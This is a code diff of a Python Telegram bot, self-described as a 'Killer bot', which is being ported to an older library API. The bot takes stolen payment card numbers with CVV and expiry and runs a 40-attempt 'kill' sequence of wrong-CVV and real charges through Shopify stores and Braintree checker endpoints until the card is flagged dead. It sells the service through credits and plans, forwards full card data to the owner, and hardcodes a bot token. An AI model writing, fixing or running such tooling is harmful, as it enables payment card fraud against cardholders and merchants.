@@ -7,18 +7,16 @@ import os
 import re
 import secrets
 import aiohttp
+import threading
 from datetime import datetime
 from collections import defaultdict
-from telegram.ext import Updater, CommandHandler as OldCommandHandler
 
-
-from telegram import Update  # ← works with v20+
-from telegram.constants import ParseMode
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import ParseMode
+from telegram.ext import Updater, CommandHandler, CallbackContext
 
 # ================= CONFIG =================
 TOKEN = "7679364536:AAHEwAKja_ku1CnmzP7iDlt8em8xSOPhqBE"
-OWNER_ID = 7446400377  # Replace with your Telegram user ID
+OWNER_ID = 7446400377
 
 # Shopify sites
 SHOPIFY_SITES = [
@@ -83,8 +81,10 @@ def deduct_credits(user_id, amount):
     return False
 
 def is_premium(user_id):
+    if user_id == OWNER_ID:
+        return True
     ud = get_user_data(user_id)
-    return ud["expiry"] > time.time() or user_id == OWNER_ID
+    return ud["expiry"] > time.time()
 
 def get_credits(user_id):
     return get_user_data(user_id)["credits"]
@@ -139,16 +139,16 @@ def redeem_code(code, user_id):
     add_credits(user_id, credits)
     return True, credits
 
-# ================= API CALLS =================
-async def report_error_to_owner(context, api_name, error_msg, card_str=""):
+# ================= API CALLS (ASYNC) =================
+async def report_error_to_owner(bot, api_name, error_msg, card_str=""):
     if OWNER_ID:
-        await context.bot.send_message(
+        await bot.send_message(
             OWNER_ID,
             f"⚠️ *API Error Report*\nAPI: `{api_name}`\nCard: `{card_str}`\nError: `{error_msg[:200]}`",
             parse_mode=ParseMode.MARKDOWN
         )
 
-async def check_shopify(card_str, use_wrong_cvv=False, wrong_cvv=None, context=None):
+async def check_shopify(card_str, use_wrong_cvv=False, wrong_cvv=None, bot=None):
     original = card_str
     if use_wrong_cvv and wrong_cvv:
         parts = card_str.split('|')
@@ -167,11 +167,11 @@ async def check_shopify(card_str, use_wrong_cvv=False, wrong_cvv=None, context=N
                 is_dead = "CARD_DECLINED" in resp_text
                 return is_dead, resp_text
     except Exception as e:
-        if context:
-            await report_error_to_owner(context, f"Shopify API (wrong_cvv={use_wrong_cvv})", str(e), original)
+        if bot:
+            await report_error_to_owner(bot, f"Shopify API (wrong_cvv={use_wrong_cvv})", str(e), original)
         return False, f"Error: {str(e)[:50]}"
 
-async def check_braintree(api_url, card_str, context=None):
+async def check_braintree(api_url, card_str, bot=None):
     url = f"{api_url}?cc={card_str}"
     try:
         async with aiohttp.ClientSession() as sess:
@@ -185,12 +185,12 @@ async def check_braintree(api_url, card_str, context=None):
                 is_dead = any(x in lower for x in ["declined", "invalid", "do not honor", "pick up", "lost", "stolen", "card_declined"])
                 return is_dead, resp_text
     except Exception as e:
-        if context:
-            await report_error_to_owner(context, f"Braintree API ({api_url})", str(e), card_str)
+        if bot:
+            await report_error_to_owner(bot, f"Braintree API ({api_url})", str(e), card_str)
         return False, f"Error: {str(e)[:50]}"
 
 # ================= KILL SEQUENCE (ALWAYS 40) =================
-async def perform_full_kill(card_str, original_cvv, context):
+async def perform_full_kill(card_str, original_cvv, bot):
     start_time = time.time()
     attempts = 0
     last_shopify_resp = ""
@@ -203,7 +203,7 @@ async def perform_full_kill(card_str, original_cvv, context):
         while wrong_cvv == int(original_cvv):
             wrong_cvv = random.randint(1, 999)
         attempts += 1
-        dead, resp = await check_shopify(card_str, use_wrong_cvv=True, wrong_cvv=wrong_cvv, context=context)
+        dead, resp = await check_shopify(card_str, use_wrong_cvv=True, wrong_cvv=wrong_cvv, bot=bot)
         last_shopify_resp = resp
         if dead:
             any_dead = True
@@ -212,7 +212,7 @@ async def perform_full_kill(card_str, original_cvv, context):
     # Phase 2: 10 correct CVV Shopify
     for _ in range(10):
         attempts += 1
-        dead, resp = await check_shopify(card_str, use_wrong_cvv=False, context=context)
+        dead, resp = await check_shopify(card_str, use_wrong_cvv=False, bot=bot)
         last_shopify_resp = resp
         if dead:
             any_dead = True
@@ -221,7 +221,7 @@ async def perform_full_kill(card_str, original_cvv, context):
     # Phase 3: 10 Braintree API1
     for _ in range(10):
         attempts += 1
-        dead, resp = await check_braintree(BRAINTREE_API1, card_str, context=context)
+        dead, resp = await check_braintree(BRAINTREE_API1, card_str, bot=bot)
         last_braintree_resp = resp
         if dead:
             any_dead = True
@@ -230,7 +230,7 @@ async def perform_full_kill(card_str, original_cvv, context):
     # Phase 4: 10 Braintree API2
     for _ in range(10):
         attempts += 1
-        dead, resp = await check_braintree(BRAINTREE_API2, card_str, context=context)
+        dead, resp = await check_braintree(BRAINTREE_API2, card_str, bot=bot)
         last_braintree_resp = resp
         if dead:
             any_dead = True
@@ -241,39 +241,27 @@ async def perform_full_kill(card_str, original_cvv, context):
 
 # ================= PARSE CARD FROM FREE TEXT =================
 def extract_card_details(text):
-    """
-    Extracts cc, month, year, cvv from any free text format.
-    Returns (cc, month, year, cvv) or None if missing.
-    """
     text = text.replace('\n', ' ').replace(',', ' ')
-
-    # 1. Find card number (16 digits, allow spaces)
     card_match = re.search(r'\b(?:card\s*(?:number|no|#)?\s*:?\s*)?(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})\b', text, re.I)
     if card_match:
         cc = re.sub(r'[\s-]', '', card_match.group(1))
     else:
-        # fallback: any 15-16 digit number
         card_match = re.search(r'\b(\d{15,16})\b', text)
         if not card_match:
             return None
         cc = card_match.group(1)
-
-    # 2. Find CVV (3-4 digits, often labeled cvv/cvc/security)
     cvv_match = re.search(r'\b(?:cvv|cvc|cvv2|security\s*code)\s*:?\s*(\d{3,4})\b', text, re.I)
     if not cvv_match:
-        cvv_match = re.search(r'\b(\d{3,4})\b', text)  # last resort
+        cvv_match = re.search(r'\b(\d{3,4})\b', text)
     if not cvv_match:
         return None
     cvv = cvv_match.group(1)
-
-    # 3. Find expiry (MM/YY or MM/YYYY or month year)
     exp_match = re.search(r'\b(?:exp|expiry|expiration|valid thru?)\s*:?\s*(\d{1,2})[/.-](\d{2,4})\b', text, re.I)
     if not exp_match:
         exp_match = re.search(r'\b(\d{1,2})[/.-](\d{2,4})\b', text)
     if not exp_match:
         exp_match = re.search(r'\b(?:jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)[a-z]*\s+(\d{2,4})\b', text, re.I)
         if exp_match:
-            # convert month name to number
             month_map = {'jan':1,'feb':2,'mar':3,'apr':4,'may':5,'jun':6,'jul':7,'aug':8,'sep':9,'oct':10,'nov':11,'dec':12}
             month_str = re.search(r'(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)', text, re.I).group(1).lower()
             month = str(month_map[month_str]).zfill(2)
@@ -281,19 +269,16 @@ def extract_card_details(text):
             if len(year) == 2:
                 year = '20' + year
             return cc, month, year, cvv
-
     if not exp_match:
         return None
-
     month = exp_match.group(1).zfill(2)
     year = exp_match.group(2)
     if len(year) == 2:
         year = '20' + year
-
     return cc, month, year, cvv
 
-# ================= TELEGRAM COMMANDS =================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ================= TELEGRAM COMMANDS (SYNC, BUT RUN ASYNC KILL IN THREAD) =================
+def start(update, context: CallbackContext):
     user_id = update.effective_user.id
     credits = get_credits(user_id)
     expiry_str = get_expiry_str(user_id)
@@ -317,9 +302,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     if user_id == OWNER_ID:
         text += "\n\n👑 *Owner powers active* – you receive error reports."
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+    update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
 
-async def plan_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def plan_menu(update, context):
     text = (
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"[⌤] Plan 1 (1 Day)\n"
@@ -342,22 +327,20 @@ async def plan_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"[↯] To purchase a plan, contact the admin.\n"
         f"[⌥] Use `/redeem code` to redeem plan codes\n"
     )
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+    update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
 
-async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def kill(update, context):
     user_id = update.effective_user.id
     credits = get_credits(user_id)
     if credits < 5:
-        await update.message.reply_text(
+        update.message.reply_text(
             "❌ *Insufficient credits!* You need 5 credits per kill.\n"
             "Redeem a code with `/redeem <code>` or buy a plan via `/plan`.",
             parse_mode=ParseMode.MARKDOWN
         )
         return
 
-    # Get full message text (after /ko)
     full_text = update.message.text
-    # Remove the command itself
     if full_text.startswith('/ko'):
         full_text = full_text[3:].strip()
     elif full_text.startswith('/Ko'):
@@ -366,7 +349,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
         full_text = ' '.join(context.args) if context.args else ""
 
     if not full_text:
-        await update.message.reply_text(
+        update.message.reply_text(
             "❌ Usage: `/ko <card details in any format>`\n"
             "Examples:\n"
             "`/ko 4147400394606212|520|07|2028`\n"
@@ -376,10 +359,9 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Extract card details
     extracted = extract_card_details(full_text)
     if not extracted:
-        await update.message.reply_text(
+        update.message.reply_text(
             "❌ Could not extract card details. Please provide at least:\n"
             "- Card number (16 digits)\n"
             "- CVV (3-4 digits)\n"
@@ -392,114 +374,123 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_str = f"{card}|{month}|{year}|{cvv}"
     masked = f"{card[:4]}****{card[-4:]}"
 
-    processing = await update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳", parse_mode=ParseMode.MARKDOWN)
+    processing_msg = update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳", parse_mode=ParseMode.MARKDOWN)
 
-    # Run full 40 attempts
-    killed, attempts, shopify_resp, braintree_resp, elapsed = await perform_full_kill(card_str, cvv, context)
-
-    if killed:
-        deduct_credits(user_id, 5)
-        new_balance = get_credits(user_id)
-        result_text = (
-            f"┏━━━━━━━⍟\n"
-            f"┃ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈 \n"
-            f"┗━━━━━━━━━━━⊛\n\n"
-            f"[⌬] Cᴀʀᴅ↬ `{masked}|{month}|{year}|{cvv}`\n"
-            f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ \n"
-            f"[⌬] Rᴇsᴘᴏɴsᴇ↬ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
-            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ 40 Tɪᴍᴇs \n"
-            f"[⌬] Tɪᴍᴇ Tᴀᴋᴇɴ↣ {elapsed:.2f} Sᴇᴄᴏɴᴅs\n"
-            f"━━━━━━━━━━━━━━━━━\n"
-            f"[⌬] Rᴇǫᴜᴇsᴛ Bʏ↬ {update.effective_user.first_name}\n"
-            f"[⌬] Bᴏᴛ Bʏ↬ ༒ 𝑺𝒕𝒐𝒓𝒎𝒀𝑻 ༒\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"• Cʀᴇᴅɪᴛs Dᴇᴅᴜᴄᴛᴇᴅ - 5 | Bᴀʟᴀɴᴄᴇ - {new_balance}"
+    # Run async kill in a separate thread to not block the bot
+    def run_kill():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        killed, attempts, shop_resp, bt_resp, elapsed = loop.run_until_complete(
+            perform_full_kill(card_str, cvv, context.bot)
         )
-    else:
-        result_text = (
-            f"❌ *Kill failed!* No dead response from any gateway.\n"
-            f"Processed: 40 Times | Time: {elapsed:.2f}s\n"
-            f"Last Shopify: `{shopify_resp[:80]}`\n"
-            f"Last Braintree: `{braintree_resp[:80]}`\n"
-            f"*No credits deducted.*"
+        if killed:
+            deduct_credits(user_id, 5)
+            new_bal = get_credits(user_id)
+            result = (
+                f"┏━━━━━━━⍟\n"
+                f"┃ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈 \n"
+                f"┗━━━━━━━━━━━⊛\n\n"
+                f"[⌬] Cᴀʀᴅ↬ `{masked}|{month}|{year}|{cvv}`\n"
+                f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ \n"
+                f"[⌬] Rᴇsᴘᴏɴsᴇ↬ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
+                f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ 40 Tɪᴍᴇs \n"
+                f"[⌬] Tɪᴍᴇ Tᴀᴋᴇɴ↣ {elapsed:.2f} Sᴇᴄᴏɴᴅs\n"
+                f"━━━━━━━━━━━━━━━━━\n"
+                f"[⌬] Rᴇǫᴜᴇsᴛ Bʏ↬ {update.effective_user.first_name}\n"
+                f"[⌬] Bᴏᴛ Bʏ↬ ༒ 𝑺𝒕𝒐𝒓𝒎𝒀𝑻 ༒\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"• Cʀᴇᴅɪᴛs Dᴇᴅᴜᴄᴛᴇᴅ - 5 | Bᴀʟᴀɴᴄᴇ - {new_bal}"
+            )
+        else:
+            result = (
+                f"❌ *Kill failed!* No dead response from any gateway.\n"
+                f"Processed: 40 Times | Time: {elapsed:.2f}s\n"
+                f"Last Shopify: `{shop_resp[:80]}`\n"
+                f"Last Braintree: `{bt_resp[:80]}`\n"
+                f"*No credits deducted.*"
+            )
+        # Update the original chat
+        context.bot.edit_message_text(
+            chat_id=update.effective_chat.id,
+            message_id=processing_msg.message_id,
+            text=result,
+            parse_mode=ParseMode.MARKDOWN
         )
-    await processing.delete()
-    await update.message.reply_text(result_text, parse_mode=ParseMode.MARKDOWN)
 
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+    threading.Thread(target=run_kill, daemon=True).start()
+
+def redeem(update, context):
     args = context.args
     if not args:
-        await update.message.reply_text("Usage: `/redeem <code>`", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Usage: `/redeem <code>`", parse_mode=ParseMode.MARKDOWN)
         return
     code = args[0]
-    success, credits = redeem_code(code, user_id)
+    success, credits = redeem_code(code, update.effective_user.id)
     if success:
-        await update.message.reply_text(f"✅ Redeemed! You received `{credits}` credits.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text(f"✅ Redeemed! You received `{credits}` credits.", parse_mode=ParseMode.MARKDOWN)
     else:
-        await update.message.reply_text("❌ Invalid or already used code.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("❌ Invalid or already used code.", parse_mode=ParseMode.MARKDOWN)
 
-# ================= ADMIN COMMANDS =================
-async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def key_command(update, context):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
         return
     args = context.args
     if len(args) != 2:
-        await update.message.reply_text("Usage: `/key <quantity> <credits>`\nExample: `/key 5 100`", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Usage: `/key <quantity> <credits>`\nExample: `/key 5 100`", parse_mode=ParseMode.MARKDOWN)
         return
     try:
         quantity = int(args[0])
-        credits = int(args[1])
-        if quantity <= 0 or credits <= 0:
+        credits_val = int(args[1])
+        if quantity <= 0 or credits_val <= 0:
             raise ValueError
     except:
-        await update.message.reply_text("Invalid numbers.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Invalid numbers.", parse_mode=ParseMode.MARKDOWN)
         return
-    codes = [generate_code(credits) for _ in range(quantity)]
-    await update.message.reply_text(f"✅ Generated {quantity} code(s) worth {credits} credits each:\n`" + "\n".join(codes) + "`", parse_mode=ParseMode.MARKDOWN)
+    codes = [generate_code(credits_val) for _ in range(quantity)]
+    update.message.reply_text(f"✅ Generated {quantity} code(s) worth {credits_val} credits each:\n`" + "\n".join(codes) + "`", parse_mode=ParseMode.MARKDOWN)
 
-async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def addadmin(update, context):
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
         return
     args = context.args
     if not args:
-        await update.message.reply_text("Usage: `/addadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Usage: `/addadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
         return
     try:
         target = int(args[0])
     except:
-        await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
         return
     add_admin(target)
-    await update.message.reply_text(f"✅ User `{target}` is now an admin.", parse_mode=ParseMode.MARKDOWN)
+    update.message.reply_text(f"✅ User `{target}` is now an admin.", parse_mode=ParseMode.MARKDOWN)
 
-async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def removeadmin(update, context):
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
         return
     args = context.args
     if not args:
-        await update.message.reply_text("Usage: `/removeadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Usage: `/removeadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
         return
     try:
         target = int(args[0])
     except:
-        await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
         return
     if remove_admin(target):
-        await update.message.reply_text(f"✅ User `{target}` is no longer an admin.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text(f"✅ User `{target}` is no longer an admin.", parse_mode=ParseMode.MARKDOWN)
     else:
-        await update.message.reply_text(f"❌ User `{target}` was not an admin.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text(f"❌ User `{target}` was not an admin.", parse_mode=ParseMode.MARKDOWN)
 
-async def plan_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def plan_assign(update, context):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
         return
     args = context.args
     if len(args) != 2:
-        await update.message.reply_text("Usage: `/plan <plan_id> <user_id>`\nPlan IDs: 1,2,3,4", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Usage: `/plan <plan_id> <user_id>`\nPlan IDs: 1,2,3,4", parse_mode=ParseMode.MARKDOWN)
         return
     try:
         plan_id = int(args[0])
@@ -507,66 +498,29 @@ async def plan_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if plan_id not in PLANS:
             raise ValueError
     except:
-        await update.message.reply_text("Invalid plan ID (1-4) or user ID.", parse_mode=ParseMode.MARKDOWN)
+        update.message.reply_text("Invalid plan ID (1-4) or user ID.", parse_mode=ParseMode.MARKDOWN)
         return
     assign_plan(target, plan_id)
     plan = PLANS[plan_id]
-    await update.message.reply_text(
+    update.message.reply_text(
         f"✅ Plan {plan_id} assigned to user `{target}`.\n"
         f"Days: {plan['days']} | Credits: {plan['credits']}",
         parse_mode=ParseMode.MARKDOWN
     )
 
-# ================= MAIN =================
-# ================= MAIN (OLD UPDATER, NO ERROR) =================
+# ================= MAIN (USING STABLE UPDATER API) =================
 def main():
     updater = Updater(TOKEN)
     dp = updater.dispatcher
-    
-    # Convert async handlers to sync + run async in threads
-    def sync_start(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(start(update, context))
-    def sync_plan_menu(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(plan_menu(update, context))
-    def sync_kill(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(kill(update, context))
-    def sync_redeem(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(redeem(update, context))
-    def sync_key(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(key_command(update, context))
-    def sync_addadmin(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(addadmin(update, context))
-    def sync_removeadmin(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(removeadmin(update, context))
-    def sync_plan_assign(update, context):
-        import asyncio
-        loop = asyncio.new_event_loop()
-        loop.run_until_complete(plan_assign(update, context))
-    
-    dp.add_handler(OldCommandHandler("start", sync_start))
-    dp.add_handler(OldCommandHandler("plan", sync_plan_menu))
-    dp.add_handler(OldCommandHandler("ko", sync_kill))
-    dp.add_handler(OldCommandHandler("redeem", sync_redeem))
-    dp.add_handler(OldCommandHandler("key", sync_key))
-    dp.add_handler(OldCommandHandler("addadmin", sync_addadmin))
-    dp.add_handler(OldCommandHandler("removeadmin", sync_removeadmin))
-    dp.add_handler(OldCommandHandler("plan", sync_plan_assign))
-    
-    print("🔥 Killer bot is running (old Updater – no AttributeError)...")
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(CommandHandler("plan", plan_menu))
+    dp.add_handler(CommandHandler("ko", kill))
+    dp.add_handler(CommandHandler("redeem", redeem))
+    dp.add_handler(CommandHandler("key", key_command))
+    dp.add_handler(CommandHandler("addadmin", addadmin))
+    dp.add_handler(CommandHandler("removeadmin", removeadmin))
+    dp.add_handler(CommandHandler("plan", plan_assign))  # overloaded
+    print("🔥 Killer bot is running (stable Updater API)...")
     print(f"👑 Owner ID: {OWNER_ID}")
     updater.start_polling()
     updater.idle()
